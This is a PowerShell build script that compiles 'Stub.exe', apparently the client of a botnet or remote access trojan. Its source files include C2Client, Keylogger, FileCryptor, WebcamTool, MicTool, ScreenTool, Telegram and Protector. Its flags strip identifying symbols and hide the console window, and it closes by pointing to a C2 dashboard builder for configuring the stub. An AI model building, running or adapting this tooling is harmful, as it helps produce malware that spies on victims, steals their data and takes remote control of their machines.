# Build Stub.exe with MinGW (Windows)
# Run from anywhere — script auto-locates itself and MinGW.
#
# Usage:
#   .\build.ps1
#   .\build.ps1 -CryptoPP "D:\CryptoPP"   # override CryptoPP path
#   .\build.ps1 -MinGW   "C:\MinGW"        # override MinGW root

param(
    [string]$CryptoPP = "",
    [string]$MinGW    = ""
)

$StubDir = $PSScriptRoot
Set-Location $StubDir

# ── Auto-detect CryptoPP ──────────────────────────────────────────────────────
if (-not $CryptoPP) {
    $candidates = @(
        "D:\CryptoPP",
        "C:\CryptoPP",
        "$env:USERPROFILE\CryptoPP",
        "C:\Libraries\CryptoPP",
        "C:\libs\cryptopp"
    )
    foreach ($c in $candidates) {
        if (Test-Path "$c\cryptlib.h") { $CryptoPP = $c; break }
        if (Test-Path "$c\crypto++\cryptlib.h") { $CryptoPP = "$c\crypto++"; break }
    }
    if (-not $CryptoPP) {
        Write-Host "ERROR: CryptoPP not found. Pass -CryptoPP <path> or install to D:\CryptoPP" -ForegroundColor Red
        Write-Host "Download: https://www.cryptopp.com/#download"
        exit 1
    }
}
Write-Host "[INFO] CryptoPP: $CryptoPP"

# ── Auto-detect MinGW ─────────────────────────────────────────────────────────
if (-not $MinGW) {
    $candidates = @(
        "C:\MinGW",
        "C:\mingw64",
        "C:\msys64\mingw64",
        "C:\msys64\ucrt64",
        "C:\Program Files\mingw-w64\x86_64-12.2.0-posix-seh-rt_v10-rev2\mingw64",
        "C:\mingw-w64"
    )
    foreach ($c in $candidates) {
        if (Test-Path "$c\bin\g++.exe") { $MinGW = $c; break }
    }
    # Also check PATH
    if (-not $MinGW) {
        $gpp = (Get-Command g++ -ErrorAction SilentlyContinue)?.Source
        if ($gpp) { $MinGW = Split-Path (Split-Path $gpp); Write-Host "[INFO] Found g++ in PATH: $gpp" }
    }
    if (-not $MinGW) {
        Write-Host "ERROR: MinGW not found. Pass -MinGW <path> or add to PATH." -ForegroundColor Red
        Write-Host "Download: https://github.com/niXman/mingw-builds-binaries/releases"
        exit 1
    }
}
Write-Host "[INFO] MinGW: $MinGW"
$env:PATH = "$MinGW\bin;$env:PATH"

$NlohmannInc = "$StubDir\..\packages\nlohmann.json.3.9.1\build\native\include"
$WinThreadLib = (Get-ChildItem "$MinGW" -Recurse -Filter "libwinpthread.a" -ErrorAction SilentlyContinue |
                  Select-Object -First 1)?.FullName
if (-not $WinThreadLib) {
    Write-Host "WARNING: libwinpthread.a not found — omitting --whole-archive flag" -ForegroundColor Yellow
}

$Sources = 'BotNet.cpp','C2Client.cpp','FileCryptor.cpp','FileManager.cpp',
           'Information.cpp','Keylogger.cpp','Manager.cpp','MicTool.cpp',
           'PrntSc.cpp','ProcessManager.cpp','Protector.cpp','Requests.cpp',
           'ScreenTool.cpp','ServiceManager.cpp','Telegram.cpp','Telemetry.cpp',
           'WebcamTool.cpp','WinMain.cpp'

# Step 1: compile resource file
Write-Host '[1/3] Compiling resource file...'
windres Stub.rc -o Stub_res.o
if ($LASTEXITCODE -ne 0) { Write-Host 'windres failed' -ForegroundColor Red; exit 1 }

# Step 2: compile + link
Write-Host '[2/3] Compiling and linking...'
$compilerArgs = $Sources + 'Stub_res.o' + @(
    '-std=c++17', '-O2', '-mwindows',
    '-s',
    '-fno-ident',
    '-fno-threadsafe-statics',
    '-ffunction-sections', '-fdata-sections',
    '-Wl,--gc-sections',
    '-static-libgcc',
    '-static-libstdc++',
    "-I$CryptoPP",
    "-I$NlohmannInc",
    "-L$CryptoPP",
    '-lcryptopp', '-lwininet', '-lgdiplus', '-lurlmon',
    '-lpsapi', '-lvfw32', '-lwinmm', '-lws2_32', '-lole32',
    '-lshlwapi', '-ladvapi32', '-luser32', '-lgdi32', '-lshell32',
    '-liphlpapi',
    '-o', 'Stub.exe'
)

if ($WinThreadLib) {
    $compilerArgs += @('-Wl,--whole-archive', $WinThreadLib, '-Wl,--no-whole-archive')
}

& g++ @compilerArgs

if ($LASTEXITCODE -ne 0) {
    Remove-Item -ErrorAction SilentlyContinue Stub_res.o
    Write-Host 'Build FAILED' -ForegroundColor Red
    exit 1
}

Remove-Item -ErrorAction SilentlyContinue Stub_res.o
Write-Host '[3/3] Done — Stub.exe ready.' -ForegroundColor Green
Write-Host "Size: $([math]::Round((Get-Item Stub.exe).Length/1024)) KB"
Write-Host 'Next: run the C2 dashboard Builder tab to configure and download the stub.'
